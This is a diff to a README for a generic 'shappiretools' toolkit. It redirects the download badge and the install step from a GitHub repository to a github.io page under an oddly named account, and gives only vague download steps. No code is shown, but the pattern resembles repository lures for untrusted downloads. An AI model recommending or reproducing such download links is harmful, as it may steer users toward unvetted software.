@@ -1,6 +1,6 @@
 # 🛠️ shappiretools - Your All-in-One Digital Toolkit
 
-[![Download Shappire Tools](https://img.shields.io/badge/Download%20Shappire%20Tools-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Erseselfindulgence441/shappiretools)
+[![Download Shappire Tools](https://img.shields.io/badge/Download%20Shappire%20Tools-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://erseselfindulgence441.github.io)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to Shappire Tools - a free, open-source platform that brings together me
 
 ## 📥 Installation Guide
 
-**Step 1:** Visit the download page by clicking the badge above or going to: https://github.com/Erseselfindulgence441/shappiretools
+**Step 1:** Visit the download page by clicking the badge above or going to: https://erseselfindulgence441.github.io
 
 **Step 2:** Visit this link to download the application. Follow the instructions on the page to get the latest version.
 
